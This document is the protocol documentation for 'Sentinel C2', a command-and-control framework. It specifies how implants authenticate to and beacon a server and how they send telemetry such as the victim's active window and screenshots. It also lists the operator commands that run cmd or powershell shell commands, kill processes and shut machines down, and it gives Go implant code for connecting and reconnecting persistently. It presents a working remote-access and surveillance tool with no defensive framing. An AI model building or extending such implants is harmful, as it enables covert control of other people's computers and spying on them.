# Sentinel C2 - WebSocket Protocol Documentation

## Overview

This document describes the WebSocket protocol used between the Sentinel C2 server, agents (implants), and the dashboard (operators).

**Important:** This implementation uses **Raw WebSocket** (not STOMP) for better compatibility with Go clients.

## Endpoints

| Endpoint | Purpose | Authentication |
|----------|---------|----------------|
| `/ws-sentinel` | Agent connections | PSK (X-Agent-Auth header) |
| `/ws-dashboard` | Dashboard connections | JWT (Authorization header or `?token=` query param) |

## Message Format

All messages use JSON with this envelope structure:

```json
{
  "type": "MESSAGE_TYPE",
  "payload": { ... },
  "request_id": "optional-correlation-id"
}
```

---

## Agent Protocol (ws-sentinel)

### Authentication

During WebSocket handshake, agent must provide:

**Headers:**
- `X-Agent-Auth`: SHA256(PSK + TIMESTAMP) in hex format
- `X-Agent-Timestamp`: Unix timestamp in milliseconds

**Example (simplified mode without timestamp):**
- `X-Agent-Auth`: SHA256(PSK)

### Agent → Server Messages

#### 1. HEARTBEAT (Telemetry)

Sent every 5 seconds (±2s jitter).

```json
{
  "type": "HEARTBEAT",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "hostname": "DESKTOP-PC01",
    "os_info": "Windows 11 Pro 23H2",
    "ip_local": "192.168.0.105",
    "cpu_load": 12.5,
    "ram_usage": 4096,
    "active_window": "Chrome - Gmail"
  }
}
```

#### 2. COMMAND_RESULT

Sent after executing a command.

```json
{
  "type": "COMMAND_RESULT",
  "payload": {
    "command_id": "550e8400-e29b-41d4-a716-446655440000",
    "hwid": "AA-BB-CC-DD-EE-FF",
    "status": "SUCCESS",
    "output": "Command output here..."
  }
}
```

**Status values:** `SUCCESS`, `ERROR`

#### 3. SCREENSHOT_UPLOAD

Sent after capturing a screenshot.

```json
{
  "type": "SCREENSHOT_UPLOAD",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "trigger_command_id": "550e8400-e29b-41d4-a716-446655440000",
    "image_base64": "/9j/4AAQSkZJRgABAQEAYABgAAD..."
  }
}
```

### Server → Agent Messages

#### COMMAND

Command to execute on agent.

```json
{
  "type": "COMMAND",
  "payload": {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "type": "SHELL",
    "params": ["ipconfig", "/all"]
  }
}
```

**Command Types:**

| Type | Description | Params |
|------|-------------|--------|
| `SHELL` | Execute shell command | `["cmd", "/c", "command"]` or `["powershell", "-c", "command"]` |
| `SCREENSHOT` | Capture screen | `[]` |
| `KILL_PROC` | Kill process by name | `["process.exe"]` |
| `MESSAGE` | Show message box | `["Title", "Message"]` |
| `PROCESS_LIST` | List running processes | `[]` |
| `OPEN_URL` | Open URL in browser | `["https://example.com"]` |
| `SHUTDOWN` | Shutdown computer | `[]` |
| `SWITCH_MODE` | Change communication mode | `["session"]` or `["beacon", "300"]` |

---

## Dashboard Protocol (ws-dashboard)

### Authentication

**Option 1 - Header:**
```
Authorization: Bearer <JWT_TOKEN>
```

**Option 2 - Query Parameter:**
```
ws://server:8080/ws-dashboard?token=<JWT_TOKEN>
```

### Dashboard → Server Messages

#### GET_AGENTS

Request list of all agents.

```json
{
  "type": "GET_AGENTS",
  "request_id": "req-123"
}
```

#### GET_STATS

Request dashboard statistics.

```json
{
  "type": "GET_STATS",
  "request_id": "req-124"
}
```

#### SEND_COMMAND

Send command to an agent.

```json
{
  "type": "SEND_COMMAND",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "type": "SHELL",
    "params": ["ipconfig", "/all"]
  },
  "request_id": "req-125"
}
```

#### GET_COMMANDS

Get command history for an agent.

```json
{
  "type": "GET_COMMANDS",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "page": 0,
    "size": 50
  },
  "request_id": "req-126"
}
```

#### GET_SCREENSHOTS

Get screenshot metadata for an agent.

```json
{
  "type": "GET_SCREENSHOTS",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "page": 0,
    "size": 20
  },
  "request_id": "req-127"
}
```

#### PING

Keep-alive ping.

```json
{
  "type": "PING",
  "request_id": "req-128"
}
```

### Server → Dashboard Messages

#### Initial Data (on connect)

Server automatically sends `AGENTS_LIST` and `STATS` on connection.

#### AGENTS_LIST

```json
{
  "type": "AGENTS_LIST",
  "payload": [
    {
      "hwid": "AA-BB-CC-DD-EE-FF",
      "hostname": "DESKTOP-PC01",
      "osInfo": "Windows 11 Pro",
      "ipLocal": "192.168.0.105",
      "status": "ONLINE",
      "communicationMode": "SESSION",
      "cpuLoad": 12.5,
      "ramUsage": 4096,
      "activeWindow": "Chrome",
      "lastSeen": "2025-10-25T10:30:00"
    }
  ],
  "request_id": "req-123"
}
```

#### STATS

```json
{
  "type": "STATS",
  "payload": {
    "totalAgents": 10,
    "onlineAgents": 7,
    "offlineAgents": 2,
    "deadAgents": 1,
    "pendingCommands": 3,
    "executedCommands": 150,
    "failedCommands": 5
  },
  "request_id": "req-124"
}
```

#### AGENT_UPDATE (Real-time)

Broadcasted when agent telemetry updates.

```json
{
  "type": "AGENT_UPDATE",
  "payload": {
    "hwid": "AA-BB-CC-DD-EE-FF",
    "hostname": "DESKTOP-PC01",
    "cpuLoad": 25.0,
    "ramUsage": 5120,
    ...
  }
}
```

#### ADMIN_EVENT (Real-time)

Broadcasted for important events.

```json
{
  "type": "ADMIN_EVENT",
  "payload": {
    "eventType": "AGENT_CONNECTED",
    "agentHwid": "AA-BB-CC-DD-EE-FF",
    "message": "Agent DESKTOP-PC01 connected",
    "timestamp": "2025-10-25T10:30:00"
  }
}
```

**Event Types:**
- `AGENT_CONNECTED`
- `AGENT_DISCONNECTED`
- `AGENT_STATUS_CHANGED`
- `COMMAND_RESULT`
- `SCREENSHOT_RECEIVED`

#### COMMAND_UPDATE (Real-time)

Broadcasted when command status changes.

```json
{
  "type": "COMMAND_UPDATE",
  "payload": {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "agentHwid": "AA-BB-CC-DD-EE-FF",
    "type": "SHELL",
    "status": "EXECUTED",
    "responseText": "Command output...",
    "executedAt": "2025-10-25T10:31:00"
  }
}
```

#### ERROR

```json
{
  "type": "ERROR",
  "payload": {
    "error": "Error message here"
  },
  "request_id": "req-xxx"
}
```

#### PONG

Response to PING.

```json
{
  "type": "PONG",
  "request_id": "req-128"
}
```

---

## Go Implant Implementation Notes

### Connection Example (gorilla/websocket)

```go
import (
    "crypto/sha256"
    "encoding/hex"
    "fmt"
    "net/http"
    "time"
    
    "github.com/gorilla/websocket"
)

func connect(serverURL, psk string) (*websocket.Conn, error) {
    // Calculate auth hash
    timestamp := fmt.Sprintf("%d", time.Now().UnixMilli())
    hash := sha256.Sum256([]byte(psk + timestamp))
    authHash := hex.EncodeToString(hash[:])
    
    // Setup headers
    headers := http.Header{}
    headers.Set("X-Agent-Auth", authHash)
    headers.Set("X-Agent-Timestamp", timestamp)
    
    // Connect
    dialer := websocket.Dialer{
        HandshakeTimeout: 10 * time.Second,
    }
    
    conn, _, err := dialer.Dial(serverURL, headers)
    return conn, err
}
```

### Message Sending Example

```go
type WebSocketMessage struct {
    Type    string      `json:"type"`
    Payload interface{} `json:"payload"`
}

func sendHeartbeat(conn *websocket.Conn, heartbeat Heartbeat) error {
    msg := WebSocketMessage{
        Type:    "HEARTBEAT",
        Payload: heartbeat,
    }
    return conn.WriteJSON(msg)
}
```

### Reconnection with Backoff

```go
func connectWithBackoff(serverURL, psk string) *websocket.Conn {
    backoff := []time.Duration{5*time.Second, 15*time.Second, 45*time.Second, 2*time.Minute, 5*time.Minute}
    maxBackoff := 1 * time.Hour
    
    attempt := 0
    for {
        conn, err := connect(serverURL, psk)
        if err == nil {
            return conn
        }
        
        delay := backoff[min(attempt, len(backoff)-1)]
        if delay > maxBackoff {
            delay = maxBackoff
        }
        
        time.Sleep(delay)
        attempt++
    }
}
```

---

## REST API Endpoints (Alternative to WebSocket)

The server also provides REST endpoints for operations:

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/login` | Get JWT token |
| GET | `/api/agents` | List all agents |
| GET | `/api/agents/{hwid}` | Get agent details |
| POST | `/api/commands` | Send command |
| GET | `/api/commands/agent/{hwid}` | Get command history |
| GET | `/api/screenshots/agent/{hwid}` | Get screenshot metadata |
| GET | `/api/screenshots/{id}/image` | Download screenshot image |
| GET | `/api/dashboard/stats` | Get statistics |
